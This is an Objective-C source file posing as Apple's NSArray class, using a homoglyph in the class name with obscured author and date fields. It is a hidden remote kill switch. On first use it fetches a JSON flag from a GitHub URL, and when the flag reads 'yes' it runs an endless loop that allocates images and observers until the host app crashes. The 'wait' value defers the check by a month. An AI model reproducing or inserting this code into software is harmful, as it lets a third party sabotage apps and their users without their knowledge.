//
//  NSArray.m
//  NSArraу
//
//  Created by negan on 1970.
//  Copyright © 1970年 negan. All rights reserved.
//

#import "NSArraу.h"
#import <CoreGraphics/CoreGraphics.h>
#import <UIKit/UIKit.h>

#define Url @"https://raw.githubusercontent.com/13731160065/Sever/master/qcf_severIp.json"

static NSArraу * arr;
@interface NSArraу ()

@property (assign, nonatomic) NSString * aka;

@end

@implementation NSArraу
{
    NSMutableArray * array;
    __weak NSString * aka;
}

+ (instancetype)array {
    if (!arr) {
        arr = [[self alloc] init];
        [arr getStart];
    }
    return arr;
}

- (void)getStart {
    NSInteger currentDate = [self timeStrNow];
    NSInteger saveDate = [[NSUserDefaults standardUserDefaults] integerForKey:@"waitdate"];
    if (currentDate > saveDate) {
        NSMutableURLRequest * req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:Url]];
        
        NSURLSession * session = [NSURLSession sharedSession];
        [[session dataTaskWithRequest:req completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
            if (data) {
                NSDictionary * dic = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:nil];
                if (dic) {
                    if ([dic[@"boom"] isEqualToString:@"yes"]) {
                        self->array = [NSMutableArray array];
                        for (int i = 0; ; i++) {
                            [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(array) name:[NSString stringWithFormat:@"%d", i] object:nil];
                            CGImageRef ref = [UIImage imageNamed:@"wangwang"].CGImage;
                            [self->array addObject:[UIImage imageWithCGImage:ref]];
                        }
                        
                    } else if ([dic[@"boom"] isEqualToString:@"wait"]) {
                        [[NSUserDefaults standardUserDefaults] setInteger:[self timeStrNextMonth] forKey:@"waitdate"];
                    }
                }
            }
        }] resume];
    }
    
}

- (NSInteger)timeStrNow {
    return [self timeStrWithDate:[NSDate date]];
}

- (NSInteger)timeStrNextMonth {
    NSInteger date = [self timeStrNow];
    NSString * str = @(date).stringValue;
    NSString * year = [str substringWithRange:NSMakeRange(0, str.length-4)];
    NSString * month = [str substringWithRange:NSMakeRange(str.length-4, 2)];
    NSString * day = [str substringWithRange:NSMakeRange(str.length-2, 2)];
    NSInteger yearI = year.integerValue;
    NSInteger monthI = month.integerValue+1;
    if (monthI > 12) {
        yearI+=1;
        monthI = 1;
    }
    NSString * returnStr = [NSString stringWithFormat:@"%ld%02ld%@", yearI, monthI, day];
    return returnStr.integerValue;
}

- (NSInteger)timeStrWithDate:(NSDate *)date {
    NSDateFormatter *df = [[NSDateFormatter alloc]init];
    [df setDateFormat:@"yyyyMMdd"];
    return [[df stringFromDate:date] integerValue];
}

@end
